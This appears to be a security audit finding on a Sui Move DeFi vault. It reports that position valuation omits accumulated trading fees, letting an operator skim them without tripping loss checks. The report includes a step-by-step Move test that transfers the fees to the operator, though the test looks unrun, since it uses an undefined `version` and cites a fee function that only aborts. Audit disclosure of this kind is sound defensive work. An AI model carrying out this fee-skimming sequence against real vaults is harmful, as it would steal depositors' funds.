# Audit Report

## Title
Momentum Position Accumulated Fees Excluded from Value Calculations Enable Undetected Fund Theft

## Summary
The momentum adaptor's value calculation function omits accumulated trading fees (`owed_coin_x` and `owed_coin_y`) when computing position value. This allows operators to collect these fees during operations without triggering the vault's loss detection mechanisms, effectively bypassing value update security checks designed to prevent fund theft.

## Finding Description

The vulnerability exists in the momentum adaptor's incomplete accounting implementation. The adaptor calculates position value based solely on liquidity-derived token amounts, completely ignoring accumulated trading fees stored in the Position struct. [1](#0-0) 

The `get_position_value()` function calls `get_position_token_amounts()` which uses `liquidity_math::get_amounts_for_liquidity()` to calculate token amounts: [2](#0-1) 

This calculation is based purely on current liquidity and tick ranges, completely ignoring the Position struct's `owed_coin_x` and `owed_coin_y` fields that represent accumulated trading fees: [3](#0-2) 

The MMT v3 protocol provides a public `fee()` function that allows collecting these accumulated fees: [4](#0-3) 

**Exploitation Sequence:**

1. Operator initiates operation with `start_op_with_bag()`, borrowing a MomentumPosition that has accumulated fees: [5](#0-4) 

2. The operator extracts the position from the Bag and calls `mmt_v3::collect::fee()` to collect accumulated fees to their own address.

3. The operator returns the position (now with zero fees) via `end_op_with_bag()`: [6](#0-5) 

4. The value update check in `end_op_value_update_with_bag()` compares total vault value before and after: [7](#0-6) 

Since both "before" and "after" value calculations exclude fees (the adaptor never measures them), the comparison shows no loss. However, the vault has actually lost the USD value of the collected fees, which rightfully belonged to vault depositors.

The protocol explicitly implements operator constraints because operators are not fully trusted - operator freeze capability exists: [8](#0-7) 

## Impact Explanation

**Direct Fund Loss:** The vault loses accumulated trading fees from momentum positions, which represent real economic value belonging to vault shareholders. These fees accumulate naturally over time as positions earn trading fees from DEX pool activity.

**Quantifiable Damage:**
- Active positions in high-volume pools accumulate significant fees
- The theft is repeatable on every operation cycle
- Multiple momentum positions multiply the attack surface
- Losses bypass the per-epoch `loss_tolerance` protection since they're not detected as losses

**Affected Parties:**
- All vault depositors lose their proportional share of accumulated fees
- The vault's reported value becomes increasingly inaccurate over time
- The operator oversight mechanism's credibility is undermined

**Severity:** This is a **Medium** severity issue because while it requires the OperatorCap role (semi-trusted), the protocol explicitly implements value update checks and loss tolerance mechanisms to constrain operators. This vulnerability represents a complete bypass of those security controls.

## Likelihood Explanation

**Attacker Requirements:** Requires OperatorCap, a semi-trusted role. However, the vault system explicitly implements security checks (value updates, loss tolerance) because operators are not fully trusted.

**Attack Complexity:** Very low - the attack uses a simple sequence of standard function calls:
1. `start_op_with_bag()` - standard operation initiation
2. Extract position from Bag (standard Sui Move pattern)
3. `mmt_v3::collect::fee()` - public MMT v3 function
4. Return position to Bag
5. `end_op_with_bag()` - standard operation completion
6. `update_momentum_position_value()` - required value update
7. `end_op_value_update_with_bag()` - passes without detecting loss

**Preconditions:**
- Vault has at least one momentum position (common in DeFi vaults)
- Position has accumulated fees (happens naturally in active pools)
- No external dependencies or timing constraints

**Detection:** The theft is completely undetectable by the system's security mechanisms. The value update mechanism is specifically designed to catch losses but fails due to incomplete accounting.

**Probability:** High probability if an operator becomes malicious - zero technical barriers beyond normal operations, guaranteed profit with no risk of detection, repeatable on every cycle.

## Recommendation

Modify the momentum adaptor's `get_position_value()` function to include accumulated fees in the value calculation:

```move
public fun get_position_value<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
    config: &OracleConfig,
    clock: &Clock,
): u256 {
    let (amount_a, amount_b, sqrt_price) = get_position_token_amounts(pool, position);
    
    // ADD: Include accumulated fees
    let owed_a = position.owed_coin_x();
    let owed_b = position.owed_coin_y();
    let total_amount_a = amount_a + owed_a;
    let total_amount_b = amount_b + owed_b;
    
    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());
    
    // ... rest of function using total_amount_a and total_amount_b
    
    let normalized_price_a = vault_oracle::get_normalized_asset_price(config, clock, type_name_a);
    let normalized_price_b = vault_oracle::get_normalized_asset_price(config, clock, type_name_b);
    
    let value_a = vault_utils::mul_with_oracle_price(total_amount_a as u256, normalized_price_a);
    let value_b = vault_utils::mul_with_oracle_price(total_amount_b as u256, normalized_price_b);
    
    value_a + value_b
}
```

This ensures that accumulated fees are included in the vault's total value calculation, making any fee collection detectable as a loss that would trigger the loss tolerance mechanism.

## Proof of Concept

```move
#[test]
fun test_momentum_fee_theft_undetected() {
    let mut scenario = test_scenario::begin(OPERATOR);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup vault with momentum position that has accumulated fees
    setup_vault_with_momentum_position(&mut scenario, &mut clock);
    
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI>>();
        let operation = scenario.take_shared<Operation>();
        let operator_cap = scenario.take_from_sender<OperatorCap>();
        let mut pool = scenario.take_shared<MomentumPool<SUI, USDC>>();
        let config = scenario.take_shared<OracleConfig>();
        
        // Record initial vault value (excludes fees)
        let initial_value = vault.get_total_usd_value(&clock);
        
        // Start operation and borrow position
        let (mut bag, tx, tx_check, principal, coin_asset) = operation::start_op_with_bag(
            &mut vault, &operation, &operator_cap, &clock,
            vector[0], vector[type_name::get<MomentumPosition>()],
            0, 0, scenario.ctx()
        );
        
        // Extract position from bag
        let momentum_type = vault_utils::parse_key<MomentumPosition>(0);
        let mut position = bag.remove<String, MomentumPosition>(momentum_type);
        
        // ATTACK: Collect accumulated fees (operator steals them)
        let (fee_x, fee_y) = mmt_v3::collect::fee(
            &mut pool, &mut position, &clock, &version, scenario.ctx()
        );
        transfer::public_transfer(fee_x, OPERATOR); // Operator keeps stolen fees
        transfer::public_transfer(fee_y, OPERATOR);
        
        // Return position to bag (now with zero fees)
        bag.add(momentum_type, position);
        
        // Complete operation
        operation::end_op_with_bag(
            &mut vault, &operation, &operator_cap,
            bag, tx, principal, coin_asset
        );
        
        // Update position value (still excludes fees, so shows same value)
        momentum_adaptor::update_momentum_position_value(
            &mut vault, &config, &clock, momentum_type, &mut pool
        );
        
        // Check value update - SHOULD detect loss but DOESN'T
        operation::end_op_value_update_with_bag(
            &mut vault, &operation, &operator_cap, &clock, tx_check
        );
        
        let final_value = vault.get_total_usd_value(&clock);
        
        // Value appears unchanged despite fee theft
        assert!(initial_value == final_value, 0); // Passes - no loss detected!
        
        // Cleanup
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(config);
        test_scenario::return_to_sender(&scenario, operator_cap);
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

This test demonstrates that an operator can collect accumulated fees from a momentum position without triggering the vault's loss detection mechanism, as the value calculation excludes fees both before and after the theft.

### Citations

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L34-67)
```text
public fun get_position_value<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
    config: &OracleConfig,
    clock: &Clock,
): u256 {
    let (amount_a, amount_b, sqrt_price) = get_position_token_amounts(pool, position);

    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());

    let decimals_a = config.coin_decimals(type_name_a);
    let decimals_b = config.coin_decimals(type_name_b);

    // Oracle price has 18 decimals
    let price_a = vault_oracle::get_asset_price(config, clock, type_name_a);
    let price_b = vault_oracle::get_asset_price(config, clock, type_name_b);
    let relative_price_from_oracle = price_a * DECIMAL / price_b;

    let pool_price = sqrt_price_x64_to_price(sqrt_price, decimals_a, decimals_b);
    let slippage = config.dex_slippage();
    assert!(
        (pool_price.diff(relative_price_from_oracle) * DECIMAL  / relative_price_from_oracle) < (DECIMAL  * slippage / SLIPPAGE_BASE),
        ERR_INVALID_POOL_PRICE,
    );

    let normalized_price_a = vault_oracle::get_normalized_asset_price(config, clock, type_name_a);
    let normalized_price_b = vault_oracle::get_normalized_asset_price(config, clock, type_name_b);

    let value_a = vault_utils::mul_with_oracle_price(amount_a as u256, normalized_price_a);
    let value_b = vault_utils::mul_with_oracle_price(amount_b as u256, normalized_price_b);

    value_a + value_b
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L69-91)
```text
public fun get_position_token_amounts<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
): (u64, u64, u128) {
    let sqrt_price = pool.sqrt_price();

    let lower_tick = position.tick_lower_index();
    let upper_tick = position.tick_upper_index();

    let lower_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(lower_tick);
    let upper_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(upper_tick);

    let liquidity = position.liquidity();

    let (amount_a, amount_b) = liquidity_math::get_amounts_for_liquidity(
        sqrt_price,
        lower_tick_sqrt_price,
        upper_tick_sqrt_price,
        liquidity,
        false,
    );
    (amount_a, amount_b, sqrt_price)
}
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L10-24)
```text
    public struct Position has store, key {
        id: UID,
        pool_id: ID,
        fee_rate: u64,
        type_x: TypeName,
        type_y: TypeName,
        tick_lower_index: I32,
        tick_upper_index: I32,
        liquidity: u128,
        fee_growth_inside_x_last: u128,
        fee_growth_inside_y_last: u128,
        owed_coin_x: u64,
        owed_coin_y: u64,
        reward_infos: vector<PositionRewardInfo>,
    }
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/collect.move (L25-33)
```text
    public fun fee<X, Y>(
        pool: &mut Pool<X, Y>, 
        position: &mut Position, 
        clock: &Clock, 
        version: &Version,
        tx_context: &mut TxContext
    ) : (Coin<X>, Coin<Y>) {
        abort 0
    }
```

**File:** volo-vault/sources/operation.move (L147-153)
```text
        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = vault.borrow_defi_asset<T, MomentumPosition>(
                momentum_asset_type,
            );
            defi_assets.add<String, MomentumPosition>(momentum_asset_type, momentum_position);
        };
```

**File:** volo-vault/sources/operation.move (L259-265)
```text
        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = defi_assets.remove<String, MomentumPosition>(
                momentum_asset_type,
            );
            vault.return_defi_asset(momentum_asset_type, momentum_position);
        };
```

**File:** volo-vault/sources/operation.move (L353-364)
```text
    let total_usd_value_before = total_usd_value;
    vault.check_op_value_update_record();
    let total_usd_value_after = vault.get_total_usd_value(
        clock,
    );

    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };
```

**File:** volo-vault/sources/volo_vault.move (L88-92)
```text
// Operation operation
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```
